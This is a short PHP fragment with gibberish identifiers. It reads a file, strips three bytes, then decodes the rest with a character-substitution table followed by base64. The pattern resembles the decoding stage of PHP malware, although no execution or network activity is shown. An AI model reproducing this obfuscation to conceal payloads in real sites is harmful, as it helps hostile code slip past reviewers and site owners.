function vydyku_athibumykh($mikira_cushashuc) {
    if ($mikira_cushashuc == 1)
        return nafido_afehuwizu();
    if ($mikira_cushashuc == 2)
        return vibyvo_tholygolyth();
}

function rihoju_yshidiqozhi($mikira_cushashuc) {
    $ytujane = vydyku_athibumykh(1);
    $ybezhab = vydyku_athibumykh(2);
    for ($ydolez = 0; $ydolez < strlen($ytujane); $ydolez++) {
        $oxejejy = substr($ytujane, $ydolez, 1);
        $ovylukh = substr($ybezhab, $ydolez, 1);
        $omeryc[$oxejejy] = $ovylukh;
    }

    $yqykihy = strtr($mikira_cushashuc, $omeryc);
    $yqykihy = base64_decode($yqykihy);

    return $yqykihy;
}

function otoseg_khochytyzim($mikira_cushashuc) {
    $tatafig = array();
    if (!file_exists($mikira_cushashuc))
        return false;
    $yrithon = @file_get_contents($mikira_cushashuc);
    if (!$yrithon)
        return false;
    $yrithon = substr($yrithon, 3);
    $tatafig = rihoju_yshidiqozhi($yrithon);
    return $tatafig;
}
